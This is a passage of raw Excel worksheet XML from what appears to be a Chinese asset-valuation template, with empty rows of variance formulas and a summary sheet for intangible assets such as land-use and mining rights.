      <c r="E7" s="578" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="180" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="578" t="n"/>
      <c r="F29" s="555" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555">
        <f>H29-G29</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>IF(G29=0,"",I29/G29*100)</f>
        <v/>
      </c>
      <c r="K29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合                    计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="307" t="n"/>
      <c r="E30" s="115" t="n"/>
      <c r="F30" s="555">
        <f>ROUND(SUM(F6:F29),2)</f>
        <v/>
      </c>
      <c r="G30" s="555">
        <f>ROUND(SUM(G6:G29),2)</f>
        <v/>
      </c>
      <c r="H30" s="555">
        <f>ROUND(SUM(H6:H29),2)</f>
        <v/>
      </c>
      <c r="I30" s="555">
        <f>H30-G30</f>
        <v/>
      </c>
      <c r="J30" s="555">
        <f>IF(G30=0,"",I30/G30*100)</f>
        <v/>
      </c>
      <c r="K30" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B2:K2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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5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 codeName="Sheet70">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I25"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A3" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A24" sqref="A24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="14.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="30.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.3333333333333" customWidth="1" style="410" min="5" max="6"/>
    <col width="20" customWidth="1" style="410" min="7" max="7"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>无形资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表4-13</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17.25" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="284" t="n"/>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="154" t="n"/>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>4-13-1</t>
        </is>
      </c>
      <c r="C6" s="397" t="inlineStr">
        <is>
          <t>无形土地</t>
        </is>
      </c>
      <c r="D6" s="182" t="inlineStr">
        <is>
          <t>无形资产-土地使用权</t>
        </is>
      </c>
      <c r="E6" s="560">
        <f>'4-13-1无形-土地'!M30</f>
        <v/>
      </c>
      <c r="F6" s="560">
        <f>'4-13-1无形-土地'!N30</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="156" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>4-13-2</t>
        </is>
      </c>
      <c r="C7" s="397" t="inlineStr">
        <is>
          <t>无形矿权</t>
        </is>
      </c>
      <c r="D7" s="182" t="inlineStr">
        <is>
          <t>无形资产-矿业权</t>
        </is>
      </c>
      <c r="E7" s="560">
        <f>'4-13-2无形-矿业权'!K30</f>
        <v/>
      </c>
      <c r="F7" s="560">
        <f>'4-13-2无形-矿业权'!L30</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="156" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>4-13-3</t>
        </is>
      </c>
      <c r="C8" s="397" t="inlineStr">
        <is>
          <t>无形其他</t>
        </is>
      </c>
      <c r="D8" s="182" t="inlineStr">
        <is>
          <t>无形资产-其他无形资产</t>
        </is>
      </c>
      <c r="E8" s="560">
        <f>'4-13-3无形-其他'!G27</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-13-3无形-其他'!I27</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="156" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="397" t="n"/>
      <c r="D9" s="182" t="n"/>
      <c r="E9" s="560" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9)</f>
        <v/>
      </c>
      <c r="I9" s="156" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B10" s="284" t="n"/>
      <c r="C10" s="397" t="n"/>
      <c r="D10" s="182" t="n"/>
      <c r="E10" s="560" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10)</f>
        <v/>
      </c>
      <c r="I10" s="156" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B11" s="284" t="n"/>
      <c r="C11" s="397" t="n"/>
      <c r="D11" s="182" t="n"/>
      <c r="E11" s="560" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11)</f>
        <v/>
      </c>
      <c r="I11" s="156" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B12" s="284" t="n"/>
      <c r="C12" s="397" t="n"/>
      <c r="D12" s="182" t="n"/>
      <c r="E12" s="560" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12)</f>
        <v/>
      </c>
      <c r="I12" s="156" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B13" s="284" t="n"/>
      <c r="C13" s="397" t="n"/>
      <c r="D13" s="182" t="n"/>
      <c r="E13" s="560" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13)</f>
        <v/>
      </c>
      <c r="I13" s="156" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B14" s="284" t="n"/>
      <c r="C14" s="397" t="n"/>
      <c r="D14" s="182" t="n"/>
      <c r="E14" s="560" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14)</f>
        <v/>
      </c>
      <c r="I14" s="156" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B15" s="284" t="n"/>
      <c r="C15" s="397" t="n"/>
      <c r="D15" s="182" t="n"/>
      <c r="E15" s="560" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15)</f>
        <v/>
      </c>
      <c r="I15" s="156" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="397" t="n"/>
      <c r="D16" s="182" t="n"/>
      <c r="E16" s="560" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16)</f>
        <v/>
      </c>
      <c r="I16" s="156" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B17" s="284" t="n"/>
      <c r="C17" s="397" t="n"/>
      <c r="D17" s="182" t="n"/>
      <c r="E17" s="560" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17)</f>
        <v/>
      </c>
      <c r="I17" s="156" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B18" s="284" t="n"/>
      <c r="C18" s="397" t="n"/>
      <c r="D18" s="182" t="n"/>
      <c r="E18" s="560" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18)</f>
        <v/>
      </c>
      <c r="I18" s="156" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B19" s="284" t="n"/>
      <c r="C19" s="397" t="n"/>
      <c r="D19" s="182" t="n"/>
      <c r="E19" s="560" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19)</f>
        <v/>
      </c>
      <c r="I19" s="156" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B20" s="284" t="n"/>
      <c r="C20" s="397" t="n"/>
      <c r="D20" s="182" t="n"/>
      <c r="E20" s="560" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20)</f>
        <v/>
      </c>
      <c r="I20" s="156" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B21" s="284" t="n"/>
      <c r="C21" s="397" t="n"/>
      <c r="D21" s="182" t="n"/>
      <c r="E21" s="560" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21)</f>
        <v/>
      </c>
      <c r="I21" s="156" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B22" s="284" t="n"/>
      <c r="C22" s="91" t="n"/>
      <c r="D22" s="397" t="n"/>
      <c r="E22" s="560" t="n"/>
      <c r="F22" s="560" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="615" t="n"/>
      <c r="I22" s="156" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="B23" s="284" t="n"/>
      <c r="C23" s="91" t="n"/>
      <c r="D23" s="397" t="n"/>
      <c r="E23" s="560" t="n"/>
      <c r="F23" s="560" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="615" t="n"/>
      <c r="I23" s="156" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="148" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B24" s="284" t="n"/>
      <c r="C24" s="397" t="inlineStr">
        <is>
          <t>无形净额</t>
        </is>
      </c>
      <c r="D24" s="397" t="inlineStr">
        <is>
          <t>合        计</t>
        </is>
      </c>
      <c r="E24" s="560">
        <f>SUM(E6:E23)</f>
        <v/>
      </c>
      <c r="F24" s="560">
        <f>SUM(F6:F23)</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="156" t="n"/>
    </row>
    <row r="25" customFormat="1" s="116">
      <c r="B25" s="346" t="n"/>
      <c r="C25" s="346" t="n"/>
      <c r="D25" s="347" t="n"/>
      <c r="E25" s="347" t="n"/>
      <c r="F25" s="184" t="n"/>
      <c r="G25" s="550" t="n"/>
      <c r="H25" s="550" t="n"/>
      <c r="I25" s="156" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F25:H25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74.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet71">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:Q30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13.6666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="7" max="10"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="10.8333333333333" customWidth="1" style="410" min="15" max="15"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="16" max="16"/>
    <col width="8" customWidth="1" style="410" min="17" max="17"/>
    <col width="9" customWidth="1" style="410" min="18" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>无形资产—土地使用权评估明细表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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="402" t="inlineStr">
        <is>
          <t>表4-13-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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176" t="n"/>
      <c r="P4" s="176" t="n"/>
      <c r="Q4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="27" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="177" t="inlineStr">
        <is>
